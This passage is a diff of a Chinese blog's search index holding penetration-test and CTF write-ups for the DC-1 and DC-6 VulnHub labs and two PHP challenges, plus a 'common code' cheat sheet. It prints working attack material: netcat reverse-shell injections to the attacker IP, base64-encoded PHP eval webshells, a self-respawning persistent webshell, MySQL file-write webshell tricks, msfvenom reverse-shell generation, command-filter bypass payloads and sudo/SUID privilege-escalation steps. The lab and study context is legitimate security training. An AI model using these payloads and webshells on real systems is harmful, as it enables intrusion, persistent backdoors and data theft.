src="/2022/04/15/DC-2/14.png" alt="img"></p><p>DC2 clear</p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>DC-6</title>
+    <url>/2022/04/22/DC-6/</url>
+    <content><![CDATA[<p>渗透环境：DC6 <a href="https://www.vulnhub.com/entry/dc-6,315/">https://www.vulnhub.com/entry/dc-6,315/</a><br>攻击机：192.168.168.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p>
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="主机存活扫描"><a href="#主机存活扫描" class="headerlink" title="主机存活扫描"></a>主机存活扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.168.0/24</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/1.png" alt="img"></p>
+<p>靶机ip为192.168.168.134</p>
+<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- 192.168.168.134</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/2.png" alt="img"></p>
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://wordy/ -e *</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/4.png" alt="img"></p>
+<p>发现wordpress后台</p>
+<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>使用wpscan扫描</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url http://wordy  --enumerate</span><br></pre></td></tr></table></figure>
+
+<p>发现存在的用户</p>
+<p><img src="/2022/04/22/DC-6/3.png" alt="img"></p>
+<p>使用burp进行爆破，失败<br>在原文下发现提示</p>
+<p><img src="/2022/04/22/DC-6/5.png" alt="img"></p>
+<p>使用提示中的字典</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt</span><br></pre></td></tr></table></figure>
+
+<p>爆破成功</p>
+<p><img src="/2022/04/22/DC-6/6.png" alt="img"></p>
+<p>登录后台寻找突破口<br>发现一次存在命令执行的地方<br>在kali开启监听端口</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p>抓包修改</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">127.0.0.1 | nc 192.168.168.128 4444 -e /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p>发送<br>上传木马</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>蚁剑连接<br>在home下发现线索</p>
+<p><img src="/2022/04/22/DC-6/8.png" alt="img"></p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>ssh连接<br>账号：graham<br>密码：GSo7isUM1D4</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/22/DC-6/9.png" alt="img"></p>
+<p>发现 &#x2F;home&#x2F;jens&#x2F;backups.sh没有密码<br>往里面添上&#x2F;bin&#x2F;bash</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> /bin/bash &gt;&gt; /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>以jens的身份执行</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u jens /home/jens/backups.sh</span><br></pre></td></tr></table></figure>
+
+<p>发现当前身份变为jens</p>
+<p><img src="/2022/04/22/DC-6/10.png" alt="img"></p>
+<p>nmap提权</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;os.execute(&quot;/bin/bash&quot;)&#x27;</span> &gt; /tmp/shell</span><br><span class="line">sudo  nmap  --script= /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>提权成功</p>
+<p><img src="/2022/04/22/DC-6/11.png" alt="img"></p>
+<p>查看flag</p>
+<p><img src="/2022/04/22/DC-6/12.png" alt="img"></p>
+<p>DC-6 clear</p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> 渗透 </tag>
-            
-            <tag> 提权 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>竞赛课-WEB5</title>
-      <link href="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/"/>
-      <url>/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/</url>
-      
-        <content type="html"><![CDATA[<p>有一说一，这道题的难度本来没这么高的，直到把flag放到了根目录下。自己挖的坑自己要埋上</p><p>先看题目说了什么</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$res</span> = FALSE;</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"><span class="keyword">if</span> (isset(<span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &amp;&amp; <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">    <span class="variable">$m</span> = [];</span><br><span class="line">    <span class="keyword">if</span> (!preg_match_all(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|php)/&quot;</span>, <span class="variable">$ip</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">        <span class="variable">$cmd</span> = <span class="string">&quot;ping -c 4 &#123;<span class="variable">$ip</span>&#125;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span> = <span class="built_in">exec</span>(<span class="variable">$cmd</span>, <span class="variable">$res</span>);</span><br><span class="line">        print_r(<span class="variable">$a</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$res</span> = <span class="variable">$m</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>emmm, 总之就是过滤了’|’, ‘&amp;’, ‘; ‘, ‘空格’，’&#x2F;‘, ‘cat’, ‘flag’, ‘php’<br>先是过滤了分号的问题，我们可以用%0a绕过这个（%0a换行）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0als</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/1.png" alt="img"></p><p>好！什么也没看出来<br>考虑上马，这里选择用base64对一句话木马进行加密<br>原型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;attack&#x27;</span>]);?&gt;</span><br></pre></td></tr></table></figure><p>base64后</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=</span><br></pre></td></tr></table></figure><p>因为它ban了很多重要的符号，我们就先将base64后的放到txt文件中</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0aecho<span class="variable">$&#123;IFS&#125;</span><span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydhdHRhY2snXSk7Pz4=&quot;</span>&gt;base64.txt</span><br></pre></td></tr></table></figure><p>访问base64.txt</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/2.png" alt="img"></p><p>OK, 下面就把它解密放到php文件中，这里我用拼接的方法绕过php过滤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?ip=%0aa=p%0ab=hp%0abase64<span class="variable">$&#123;IFS&#125;</span>-d<span class="variable">$&#123;IFS&#125;</span>base64.txt&gt;shell.$a<span class="variable">$b</span></span><br></pre></td></tr></table></figure><p>用蚁剑进行连接</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/3.png" alt="img"></p><p>成功连接后访问根目录</p><p><img src="/2022/04/15/%E7%AB%9E%E8%B5%9B%E8%AF%BE-WEB5/4.png" alt="img"></p><p>获得flag</p>]]></content>
-      
-      
+      <tags>
+        <tag>渗透</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>常用代码汇总（施工中。。。）</title>
+    <url>/2022/04/22/%E5%B8%B8%E7%94%A8%E4%BB%A3%E7%A0%81%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h2 id="木马"><a href="#木马" class="headerlink" title="木马"></a>木马</h2><h3 id="php"><a href="#php" class="headerlink" title="php"></a>php</h3><p>一句话木马</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;L1ang&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&quot;PD9waHAgQGV2YWwoJF9QT1NUWydMMWFuZyddKTs/Pg==&quot;</span>|<span class="built_in">base64</span> -d &gt; shell.php</span><br></pre></td></tr></table></figure>
+
+<p>php内存马（不死马）</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">set_time_limit</span>(<span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">ignore_user_abort</span>(<span class="number">1</span>);   <span class="comment">//1表示，忽略与客户端断开连接，继续执行</span></span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="keyword">__FILE__</span>);       <span class="comment">//隐藏当前文件</span></span><br><span class="line">    <span class="variable">$file</span>=<span class="string">&quot;.shell.php&quot;</span>;</span><br><span class="line">    <span class="variable">$shell</span>=<span class="string">&quot;&lt;?php unlink(__FILE__);substr(md5(\$_GET[&#x27;user&#x27;]),28)==&#x27;ec6b&#x27;&amp;&amp;eval(\$_POST[&#x27;attack&#x27;]);?&gt;&quot;</span>; <span class="comment">#md5=L1ang</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$file</span>,<span class="variable">$shell</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&#x27;chmod 777 .shell.php&#x27;</span>);</span><br><span class="line">        <span class="title function_ invoke__">touch</span>(<span class="string">&quot;.shell.php&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">usleep</span>(<span class="number">50</span>);</span><br><span class="line">    &#125;</span><br><span class="line">;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="mysql木马注入"><a href="#mysql木马注入" class="headerlink" title="mysql木马注入"></a>mysql木马注入</h3><p>日志</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">    general_log = on;</span><br><span class="line">    general_log_file = <span class="string">&#x27;路径&#x27;</span>;</span><br><span class="line">利用：</span><br><span class="line">    select <span class="string">&#x27;&lt;?php eval($_POST[L1ang]);?&gt;&#x27;</span>    </span><br></pre></td></tr></table></figure>
+
+<p>写入文件</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">条件：</span><br><span class="line">    mysql连接用户有file权限</span><br><span class="line">    secure-file-priv不为null</span><br><span class="line">利用：</span><br><span class="line">    select <span class="string">&#x27;&lt;?php @eval($_POST[L1ang])?&gt;&#x27;</span> INTO OUTFILE <span class="string">&#x27;路径&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><h3 id="交互shell"><a href="#交互shell" class="headerlink" title="交互shell"></a>交互shell</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>存活主机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sP IP段</span><br></pre></td></tr></table></figure>
+
+<p>端口探测</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sS -p- IP</span><br></pre></td></tr></table></figure>
+
+<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u url -e *</span><br></pre></td></tr></table></figure>
+
+<h3 id="nc监听"><a href="#nc监听" class="headerlink" title="nc监听"></a>nc监听</h3><p>kali(攻击机)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -lpnv 4444</span><br></pre></td></tr></table></figure>
+
+<p>目标机</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc ip 4444 -e /bin/bash </span><br></pre></td></tr></table></figure>
+
+<h3 id="cms信息扫描"><a href="#cms信息扫描" class="headerlink" title="cms信息扫描"></a>cms信息扫描</h3><h4 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wpscan --url url --enumerate</span><br></pre></td></tr></table></figure>
+
+<h4 id="joomla"><a href="#joomla" class="headerlink" title="joomla"></a>joomla</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">joomscan --url url</span><br></pre></td></tr></table></figure>
+
+<h3 id="msf"><a href="#msf" class="headerlink" title="msf"></a>msf</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload payload/php/meterpreter/reverse_tcp //payload根据实际环境选择</span><br><span class="line"><span class="built_in">set</span> lhost IP //攻击机ip</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=IP LPORT=4444 -f raw &gt; shell.php //生成shell，上传到目标机，LHOST为攻击机IP</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>学习</category>
       </categories>
-      
-      
-        <tags>
-            
-            <tag> CTF </tag>
-            
-            <tag> WEB </tag>
-            
-            <tag> 绕过 </tag>
-            
-        </tags>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title>渗透-DC1</title>
-      <link href="/2022/04/15/DC-1/"/>
-      <url>/2022/04/15/DC-1/</url>
-      
-        <content type="html"><![CDATA[<p>渗透环境：DC1<br>攻击机：192.168.138.128<br>靶机：ip地址未知, 已知ip与攻击机在同一网段下</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶机环境：<a href="https://www.vulnhub.com/entry/dc-1,292/">https://www.vulnhub.com/entry/dc-1,292/</a></p><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="使用nmap扫描存活的主机"><a href="#使用nmap扫描存活的主机" class="headerlink" title="使用nmap扫描存活的主机"></a>使用nmap扫描存活的主机</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap  -sP 192.168.138.0/24</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/1.png" alt="img"></p><p>192.168.178.129：目标主机</p><h3 id="扫描目标主机对外开放的端口"><a href="#扫描目标主机对外开放的端口" class="headerlink" title="扫描目标主机对外开放的端口"></a>扫描目标主机对外开放的端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">namp -sS -p- 192.168.178.129</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/2.png" alt="img"></p><p>发现开启了端口80<br>浏览192.168.178.129:80</p><p><img src="/2022/04/15/DC-1/3.png" alt="img"></p><p>查看Wappalyzer</p><p><img src="/2022/04/15/DC-1/4.png" alt="img"></p><p>发现cms为Drupal，这版本有点low，估计有漏洞</p><h2 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h2><h3 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h3><p>使用msf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search drupal</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/5.png" alt="img"></p><p>这里我们选择exploit&#x2F;multi&#x2F;http&#x2F;drupal_drupageddon</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use 2</span><br><span class="line">options//查看需要设置的参数</span><br><span class="line"><span class="built_in">set</span> RHOSTS 192.168.178.129//设置目标ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功后我们执行ls，查看当前目录</p><p><img src="/2022/04/15/DC-1/6.png" alt="img"></p><p>发现flag1.txt，打开查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> flag1.txt</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/7.png" alt="img"></p><h3 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h3><p>到这里，上传个一句话木马看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /data/shell.php</span><br></pre></td></tr></table></figure><p>用蚁剑进行连接</p><p><img src="/2022/04/15/DC-1/8.png" alt="img"></p><p>找找第二个flag在哪<br>最后发现在settings.php中</p><p><img src="/2022/04/15/DC-1/9.png" alt="img"></p><h3 id="flag3"><a href="#flag3" class="headerlink" title="flag3"></a>flag3</h3><p>里面还有数据库的账号密码，也发现是mysql<br>在msf上传个交互shell, 然后连接mysql</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br><span class="line">python -c <span class="string">&#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span></span><br><span class="line">mysql -u dbuser -p </span><br><span class="line">R0ck3t</span><br></pre></td></tr></table></figure><p>然后就常规的，查库，查表，查列，爆内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">show databases; </span><br><span class="line">use drupaldb; </span><br><span class="line">show tables; </span><br><span class="line">select * from <span class="built_in">users</span>; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/10.png" alt="img"></p><p>这里admin的密码被加密了，我们选择update的方式改为我们知道的密码<br>其中drupal可以通过password-hash.sh生成新的密码<br>我们在www目录执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/11.png" alt="img"></p><p>sql中的替换语句</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">update <span class="built_in">users</span> <span class="built_in">set</span> pass=<span class="string">&#x27;$S$DtPgSa61SbR1DXIh4wWcMft/rOmsKXcgvxTUAgenIMRbH65ZUAZu&#x27;</span> <span class="built_in">where</span> name=<span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><p>用账号：admin 密码：admin ，登录192.168.178.129:80查看里面信息</p><p><img src="/2022/04/15/DC-1/12.png" alt="img"></p><h3 id="flag4"><a href="#flag4" class="headerlink" title="flag4"></a>flag4</h3><p>在home目录下发现flag4.txt</p><p><img src="/2022/04/15/DC-1/13.png" alt="img"></p><h3 id="flag5"><a href="#flag5" class="headerlink" title="flag5"></a>flag5</h3><p>所以我们要提权到root，这里我们用find提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/14.png" alt="img"></p><p>发现find能利用<br>在&#x2F;tmp目录下创建command文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">touch</span> <span class="built_in">command</span></span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">whoami</span> \;</span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/15.png" alt="img"></p><p>发现获得root权限了<br>修改命令</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">ls</span> /root \; </span><br><span class="line">find <span class="built_in">command</span> -<span class="built_in">exec</span> <span class="built_in">cat</span> /root/thefinalflag.txt \; </span><br></pre></td></tr></table></figure><p><img src="/2022/04/15/DC-1/16.png" alt="img"></p><p>到处为止DC-1完成</p>]]></content>
-      
-      
+      <tags>
+        <tag>提权</tag>
+        <tag>木马</tag>
+        <tag>命令</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>竞赛课-babytrick</title>
+    <url>/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/</url>
+    <content><![CDATA[<p>看看源码是什么先</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span> &lt;?<span class="title">php</span></span><br><span class="line">    <span class="title">echo</span> &quot;<span class="title">use</span> <span class="title">your</span> <span class="title">baby</span> <span class="title">trick</span> <span class="title">bypass</span> <span class="title">me</span>&quot;;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_error&quot;</span>, <span class="literal">false</span>); </span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line">    <span class="variable">$str</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>])?<span class="variable">$_GET</span>[<span class="string">&#x27;O_O&#x27;</span>]:<span class="string">&#x27;O_O&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>], <span class="string">&quot;O_O&quot;</span>) !==<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;O_O, baby&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> (<span class="variable">$str</span>&lt;<span class="number">9999999999</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too small&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">elseif</span> ((<span class="keyword">string</span>)<span class="variable">$str</span>&gt;<span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;too big&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$num</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>])?<span class="variable">$_GET</span> [<span class="string">&#x27;num&#x27;</span>]:<span class="string">&#x27;num&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$num</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;no num&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span> (<span class="variable">$num</span>) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span> :</span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span> :</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;secret.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span> :</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;2333333&quot;</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> too small</span><br></pre></td></tr></table></figure>
+
+<p>好！先是一个_的问题，这里直接用空格或者是%0a就能替换掉，这样第一个就过了。<br>其次就是一个数字大小判断的问题，这里用数组进行绕过</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?O O[]=9999999999</span><br></pre></td></tr></table></figure>
+
+<p>num的要求是2，但不能是数字</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">num=2a</span><br></pre></td></tr></table></figure>
+
+<p>f12查看源码，发现多了</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?php</span><br><span class="line">    <span class="string">&quot;my secret is in f35cdaa4e8672a43e73aee7c2dd51731, try to get it&quot;</span>;</span><br><span class="line">?</span><br></pre></td></tr></table></figure>
+
+<p>访问f35cdaa4e8672a43e73aee7c2dd51731.php</p>
+<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/1.png" alt="img"></p>
+<p>绕过问题<br>看看有什么</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">ls</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/2.png" alt="img"></p>
+<p>抓个当前的php看看先，这里过滤了cat，php，我们用tac</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=<span class="built_in">tac</span><span class="variable">$&#123;IFS&#125;</span>f35cdaa4e8672a43e73aee7c2dd51731.p<span class="string">&quot;&quot;</span>hp</span><br></pre></td></tr></table></figure>
+
+<p>这样就ok啦，整理下返回的内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^.*php.*$|^.*echo.*$|^.*cat.*$|^.*busybox.*$|[A-Z0-9a-z].*&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&gt;[A-Za-z0-9]|[A-Z0-9a-z].*&gt;&amp;[A-Za-z0-9]|^.*rm.*$/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">         <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123; <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>大概就是这个样子了<br>构造我们的payload</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?cmd=%0als /</span><br><span class="line">?cmd=%0atac /flag</span><br></pre></td></tr></table></figure>
+
+<p>这样就能拿到flag了</p>
+<p><img src="/2022/04/16/%E7%AB%9E%E8%B5%9B%E8%AF%BE-babytrick/3.png" alt="img"></p>
+]]></content>
       <categories>
-          
-          <category> 实践 </category>
-          
+        <category>实践</category>
       </categories>
-      
-      
-        <tags>
-            
